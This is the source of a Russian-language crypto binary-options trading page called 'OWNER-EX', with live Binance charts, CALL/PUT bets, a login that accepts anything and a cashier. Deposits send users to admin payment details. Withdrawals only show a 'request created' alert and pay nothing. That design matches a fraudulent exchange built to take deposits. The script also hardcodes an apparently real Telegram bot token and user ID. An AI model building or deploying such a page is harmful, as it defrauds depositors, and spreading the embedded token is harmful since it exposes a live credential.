<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OWNER-EX PRO TERMINAL</title>
    
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2220%22 fill=%22%230ecb81%22/><text y=%22.9em%22 font-size=%2280%22 font-weight=%22900%22 x=%2250%%22 text-anchor=%22middle%22 fill=%22%23000%22>E</text></svg>">
    
    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');

        :root {
            --bg: #0b0e11;
            --panel: #161a1e;
            --accent: #0ecb81;
            --red: #f6465d;
            --green: #0ecb81;
            --border: #2b2f36;
            --radius: 6px;
        }

        body, html {
            margin: 0; padding: 0;
            background: var(--bg);
            color: #eaecef;
            font-family: 'Inter', sans-serif;
            height: 100%;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* --- AUTH SCREEN --- */
        #authScreen {
            position: fixed; inset: 0; background: var(--bg); z-index: 9999;
            display: flex; align-items: center; justify-content: center;
        }
        .auth-card {
            background: var(--panel); padding: 30px; border-radius: 12px;
            width: 320px; border: 1px solid var(--border); text-align: center;
        }
        .auth-logo { margin-bottom: 20px; font-weight: 900; font-size: 24px; color: var(--accent); }

        /* --- HEADER --- */
        header {
            height: 48px; background: var(--panel);
            border-bottom: 1px solid var(--border);
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 15px; flex-shrink: 0; z-index: 100;
        }
        .header-left { display: flex; align-items: center; gap: 15px; }
        .logo-box { display: flex; align-items: center; gap: 8px; cursor: pointer; }
        .logo-icon {
            width: 26px; height: 26px; background: var(--accent);
            border-radius: 4px; display: flex; align-items: center; justify-content: center;
            color: #000; font-weight: 900; font-size: 16px;
        }
        .logo-text { font-weight: 800; font-size: 16px; letter-spacing: 0.5px; }

        /* УЛУЧШЕННЫЙ ВЫБОР КРИПТЫ */
        .asset-select-container {
            background: #000; border: 1px solid var(--border);
            border-radius: 4px; padding: 0 8px;
        }
        select#assetSelect {
            background: transparent; color: #fff; border: none;
            padding: 4px 0; font-size: 12px; font-weight: 600;
            outline: none; cursor: pointer; min-width: 130px;
        }

        .acc-toggle { display: flex; background: #000; border: 1px solid var(--border); padding: 2px; border-radius: 4px; }
        .acc-btn {
            padding: 3px 10px; border: none; background: none;
            color: #555; cursor: pointer; font-size: 10px;
            font-weight: 700; border-radius: 3px;
        }
        .acc-btn.active { background: var(--accent); color: #000; }
        #balanceDisplay { font-weight: 800; color: var(--green); font-size: 16px; margin-left: 15px; }

        /* --- LAYOUT --- */
        .terminal-container {
            display: grid; grid-template-columns: 50px 1fr 260px;
            flex: 1; min-height: 0;
        }
        .side-nav {
            background: var(--panel); border-right: 1px solid var(--border);
            display: flex; flex-direction: column; align-items: center;
            padding: 15px 0; gap: 20px;
        }
        .nav-item { font-size: 18px; color: #848e9c; cursor: pointer; transition: 0.2s; }
        .nav-item:hover { color: var(--accent); }

        .chart-section { display: flex; flex-direction: column; border-right: 1px solid var(--border); position: relative; background: #000; }
        .chart-overlay { position: absolute; top: 15px; left: 15px; z-index: 10; pointer-events: none; }
        .overlay-sym { font-size: 18px; font-weight: 800; color: #fff; }
        .overlay-pay { font-size: 12px; font-weight: 700; color: var(--accent); margin-top: 2px; }

        #chart { flex: 1; }

        .history-table { height: 140px; background: var(--panel); border-top: 1px solid var(--border); overflow-y: auto; padding: 10px; }
        table { width: 100%; border-collapse: collapse; font-size: 11px; }
        th { text-align: left; color: #848e9c; padding-bottom: 6px; border-bottom: 1px solid var(--border); }
        td { padding: 6px 0; border-bottom: 1px solid #222; }

        /* --- TRADE PANEL --- */
        .trade-panel { padding: 20px; background: var(--panel); display: flex; flex-direction: column; gap: 12px; }
        .input-group { background: var(--bg); border: 1px solid var(--border); padding: 10px; border-radius: var(--radius); }
        .input-group label { display: block; font-size: 9px; color: #848e9c; margin-bottom: 4px; text-transform: uppercase; }
        .input-group input { background: transparent; border: none; color: #fff; width: 100%; font-size: 16px; font-weight: 700; outline: none; }

        .btn-exec { height: 44px; border: none; border-radius: var(--radius); font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.1s; }
        .btn-call { background: var(--green); color: #000; }
        .btn-put { background: var(--red); color: #fff; }
        .btn-exec:active { transform: scale(0.97); }

        /* --- FOOTER --- */
        footer { height: 28px; background: var(--panel); border-top: 1px solid var(--border); display: flex; align-items: center; justify-content: center; gap: 25px; font-size: 10px; color: #848e9c; }
        footer span { cursor: pointer; }
        footer span:hover { color: #fff; }

        /* --- MODALS --- */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; display: none; justify-content: center; align-items: center; backdrop-filter: blur(4px); }
        .modal-box { background: var(--panel); width: 380px; padding: 25px; border-radius: 10px; border: 1px solid var(--border); }
        .custom-input { background: #0b0e11; border: 1px solid var(--border); color: #fff; padding: 10px; border-radius: 4px; width: 100%; box-sizing: border-box; margin-bottom: 10px; font-size: 13px; }

        .pay-methods { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
        .pay-item { background: #0b0e11; border: 1px solid var(--border); padding: 12px; border-radius: 6px; text-align: center; cursor: pointer; font-size: 11px; }
        .pay-item.active { border-color: var(--accent); background: #1c2127; }
        .pay-item i { color: var(--accent); margin-bottom: 5px; display: block; }
        
        #paymentInfoPage { display: none; text-align: center; }
        .qr-placeholder { width: 120px; height: 120px; background: #fff; margin: 15px auto; border-radius: 6px; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold; font-size: 10px; }
    </style>
</head>
<body>

<div id="authScreen">
    <div class="auth-card">
        <div class="auth-logo">OWNER-EX</div>
        <input type="text" id="authEmail" class="custom-input" placeholder="Email / Логин">
        <input type="password" id="authPass" class="custom-input" placeholder="Пароль">
        <button onclick="login()" class="btn-exec btn-call" style="width:100%; margin-top:10px;">ВОЙТИ</button>
        <p style="font-size: 11px; color: gray; margin-top: 15px; cursor: pointer;">Нет аккаунта? Регистрация</p>
    </div>
</div>

<header>
    <div class="header-left">
        <div class="logo-box">
            <div class="logo-icon">E</div>
            <div class="logo-text">OWNER-EX</div>
        </div>
        <div class="asset-select-container">
            <select id="assetSelect" onchange="updateSymbol(this.value)">
                <option value="BTCUSDT">₿ BITCOIN / USDT</option>
                <option value="ETHUSDT">Ξ ETHEREUM / USDT</option>
                <option value="SOLUSDT">◎ SOLANA / USDT</option>
                <option value="BNBUSDT">◈ BINANCE / USDT</option>
            </select>
        </div>
    </div>
    <div style="display: flex; align-items: center;">
        <div class="acc-toggle">
            <button class="acc-btn active" id="demoBtn" onclick="switchAccount('demo')">DEMO</button>
            <button class="acc-btn" id="realBtn" onclick="switchAccount('real')">REAL</button>
        </div>
        <div id="balanceDisplay">$10,000.00</div>
    </div>
</header>

<div class="terminal-container">
    <div class="side-nav">
        <i class="fas fa-chart-line nav-item" onclick="closeModals()"></i>
        <i class="fas fa-wallet nav-item" onclick="openModal('cashierModal')"></i>
        <i class="fas fa-user-circle nav-item" onclick="openModal('profileModal')"></i>
        <i class="fas fa-headset nav-item" onclick="alert('Поддержка: @owner_ex_admin')"></i>
    </div>

    <div class="chart-section">
        <div class="chart-overlay">
            <div class="overlay-sym" id="chartSymbol">BTC / USDT</div>
            <div class="overlay-pay">ВЫПЛАТА 82%</div>
        </div>
        <div id="chart"></div>
        <div class="history-table">
            <table>
                <thead><tr><th>АКТИВ</th><th>ТИП</th><th>СУММА</th><th>ДОХОД</th></tr></thead>
                <tbody id="tradeHistoryBody"></tbody>
            </table>
        </div>
    </div>

    <div class="trade-panel">
        <div class="input-group"><label>Сумма (USDT)</label><input type="number" id="tradeAmount" value="100"></div>
        <div class="input-group"><label>Время (Сек)</label><input type="number" id="tradeTime" value="30"></div>
        <button class="btn-exec btn-call" onclick="handleTrade('CALL')">ВЫШЕ ↑</button>
        <button class="btn-exec btn-put" onclick="handleTrade('PUT')">НИЖЕ ↓</button>
    </div>
</div>

<footer>
    <span onclick="alert('Техподдержка @owner_ex_support')">ПОДДЕРЖКА</span>
    <span onclick="alert('FAQ')">ЧАСТЫЕ ВОПРОСЫ</span>
    <span onclick="alert('Privacy Policy')">ПОЛИТИКА</span>
</footer>

<div id="profileModal" class="modal-overlay">
    <div class="modal-box">
        <h4 style="text-align: center; margin-top:0;">ПРОФИЛЬ</h4>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
            <input type="text" id="p_name" class="custom-input" placeholder="Имя">
            <input type="text" id="p_surname" class="custom-input" placeholder="Фамилия">
            <input type="text" id="p_nick" class="custom-input" placeholder="Никнейм">
            <input type="text" id="p_country" class="custom-input" placeholder="Страна">
        </div>
        <button onclick="saveProfile()" class="btn-exec btn-call" style="width:100%; margin-top:10px;">СОХРАНИТЬ</button>
        <div onclick="closeModals()" style="text-align:center; color:gray; cursor:pointer; margin-top:15px; font-size:11px;">ЗАКРЫТЬ</div>
    </div>
</div>

<div id="cashierModal" class="modal-overlay">
    <div class="modal-box">
        <div id="cashierMain">
            <div style="display:flex; justify-content: space-around; margin-bottom:15px; border-bottom:1px solid var(--border); padding-bottom:10px;">
                <span id="tabDep" style="cursor:pointer; color:var(--accent); font-weight:800;" onclick="switchTab('dep')">ДЕПОЗИТ</span>
                <span id="tabWit" style="cursor:pointer; color:gray; font-weight:800;" onclick="switchTab('wit')">ВЫВОД</span>
            </div>
            <div class="pay-methods">
                <div class="pay-item active" onclick="selectPay(this, 'USDT (TRC20)')"><i class="fab fa-ethereum"></i><span>USDT</span></div>
                <div class="pay-item" onclick="selectPay(this, 'Bitcoin')"><i class="fab fa-bitcoin"></i><span>BTC</span></div>
                <div class="pay-item" onclick="selectPay(this, 'Карта')"><i class="fas fa-credit-card"></i><span>Карта</span></div>
                <div class="pay-item" onclick="selectPay(this, 'СБП')"><i class="fas fa-mobile-alt"></i><span>СБП</span></div>
            </div>
            <input type="number" id="cashAmount" class="custom-input" placeholder="Сумма ($)">
            <input type="text" id="cashWallet" class="custom-input" placeholder="Ваши реквизиты" style="display:none;">
            <button id="cashBtn" onclick="goToPaymentInfo()" class="btn-exec btn-call" style="width:100%;">ПОПОЛНИТЬ</button>
        </div>

        <div id="paymentInfoPage">
            <h4 style="color:var(--accent)">РЕКВИЗИТЫ ОПЛАТЫ</h4>
            <div id="adminRequisites" style="background:#000; padding:12px; border-radius:4px; font-family:monospace; margin:10px 0; font-size:11px; word-break:break-all;"></div>
            <p style="font-size:10px; color:gray;">Переведите сумму и нажмите "Я оплатил"</p>
            <button onclick="confirmPayment()" class="btn-exec btn-call" style="width:100%; margin-top:10px;">Я ОПЛАТИЛ</button>
            <div onclick="backToCashier()" style="text-align:center; color:gray; cursor:pointer; margin-top:10px; font-size:11px;">НАЗАД</div>
        </div>
        <div onclick="closeModals()" style="text-align:center; color:gray; cursor:pointer; margin-top:15px; font-size:11px;">ОТМЕНА</div>
    </div>
</div>

<script>
    const TG_TOKEN = "8102627080:AAGGbjyR0g1VzICKb-ait4t3CA34PJz1g5M";
    const TG_USER_ID = 6426834853;

    let bals = JSON.parse(localStorage.getItem('bals')) || { demo: 10000, real: 0 };
    let tHist = JSON.parse(localStorage.getItem('tradeHistory')) || [];
    let currentAccount = 'demo', lastPrice = 0, currentTab = 'dep', selectedMethod = 'USDT (TRC20)';

    function login() {
        document.getElementById('authScreen').style.display = 'none';
        initChart(); updateUI();
    }

    function saveAll() {
        localStorage.setItem('bals', JSON.stringify(bals));
        localStorage.setItem('tradeHistory', JSON.stringify(tHist));
    }

    function updateUI() {
        document.getElementById('balanceDisplay').innerText = `$${bals[currentAccount].toLocaleString('en-US', {minimumFractionDigits: 2})}`;
        document.getElementById('tradeHistoryBody').innerHTML = tHist.slice(0,10).map(h => `
            <tr><td>${h.s}</td><td style="color:${h.t==='CALL'?'#0ecb81':'#f6465d'}">${h.t}</td><td>$${h.a}</td><td style="color:${h.r.includes('+')?'#0ecb81':'#f6465d'}">${h.r}</td></tr>
        `).join('');
    }

    window.switchTab = (tab) => {
        currentTab = tab;
        document.getElementById('tabDep').style.color = tab === 'dep' ? 'var(--accent)' : 'gray';
        document.getElementById('tabWit').style.color = tab === 'wit' ? 'var(--accent)' : 'gray';
        document.getElementById('cashBtn').innerText = tab === 'dep' ? 'ПОПОЛНИТЬ' : 'ВЫВЕСТИ';
        document.getElementById('cashWallet').style.display = tab === 'wit' ? 'block' : 'none';
    };

    window.selectPay = (el, name) => {
        document.querySelectorAll('.pay-item').forEach(p => p.classList.remove('active'));
        el.classList.add('active'); selectedMethod = name;
    };

    window.goToPaymentInfo = () => {
        const amt = document.getElementById('cashAmount').value;
        if(!amt || amt < 10) return alert("Минимум $10");
        if(currentTab === 'dep') {
            document.getElementById('cashierMain').style.display = 'none';
            document.getElementById('paymentInfoPage').style.display = 'block';
            const reqs = { 'USDT (TRC20)': 'TR7NHqfj2Cc...Адрес', 'Bitcoin': '1A1zP1eP5QG...BTC', 'Карта': '4276 0000 0000 0000', 'СБП': '+79000000000' };
            document.getElementById('adminRequisites').innerText = reqs[selectedMethod];
        } else {
            alert("Заявка на вывод создана!"); closeModals();
        }
    };

    window.backToCashier = () => {
        document.getElementById('cashierMain').style.display = 'block';
        document.getElementById('paymentInfoPage').style.display = 'none';
    };

    window.confirmPayment = () => {
        alert("Ожидайте подтверждения."); closeModals(); backToCashier();
    };

    window.openModal = (id) => document.getElementById(id).style.display = 'flex';
    window.closeModals = () => document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none');

    window.handleTrade = (type) => {
        const amt = parseFloat(document.getElementById('tradeAmount').value);
        if (amt > bals[currentAccount] || amt <= 0) return alert("Недостаточно средств!");
        bals[currentAccount] -= amt; updateUI();
        const startPrice = lastPrice;
        const symbol = document.getElementById('assetSelect').value.split(' ')[1];
        setTimeout(() => {
            const win = (type === 'CALL' && lastPrice > startPrice) || (type === 'PUT' && lastPrice < startPrice);
            const resVal = win ? (amt * 0.82) : -amt;
            const resText = win ? `+$${resVal.toFixed(2)}` : `-$${amt.toFixed(2)}`;
            if (win) bals[currentAccount] += (amt + resVal);
            tHist.unshift({ s: symbol, t: type, a: amt, r: resText });
            saveAll(); updateUI();
        }, parseInt(document.getElementById('tradeTime').value) * 1000);
    };

    window.switchAccount = (acc) => {
        currentAccount = acc;
        document.getElementById('demoBtn').classList.toggle('active', acc === 'demo');
        document.getElementById('realBtn').classList.toggle('active', acc === 'real');
        updateUI();
    };

    function initChart() {
        const chart = LightweightCharts.createChart(document.getElementById('chart'), {
            layout: { background: { color: '#000000' }, textColor: '#848e9c' },
            grid: { vertLines: { color: '#111' }, horzLines: { color: '#111' } },
            timeScale: { timeVisible: true, secondsVisible: true }
        });
        const series = chart.addCandlestickSeries({ upColor: '#0ecb81', downColor: '#f6465d', borderVisible: false, wickUpColor: '#0ecb81', wickDownColor: '#f6465d' });
        window.updateSymbol = (sym) => {
            document.getElementById('chartSymbol').innerText = sym.replace('USDT', ' / USDT');
            fetch(`https://api.binance.com/api/v3/klines?symbol=${sym}&interval=1m&limit=500`)
                .then(r => r.json()).then(d => series.setData(d.map(x => ({ time: x[0]/1000, open: +x[1], high: +x[2], low: +x[3], close: +x[4] }))));
            if (window.ws) window.ws.close();
            window.ws = new WebSocket(`wss://stream.binance.com:9443/ws/${sym.toLowerCase()}@kline_1s`);
            window.ws.onmessage = e => {
                const k = JSON.parse(e.data).k; lastPrice = +k.c;
                series.update({ time: k.t/1000, open: +k.o, high: +k.h, low: +k.l, close: lastPrice });
            };
        };
        updateSymbol('BTCUSDT');
    }
</script>
</body>
</html>
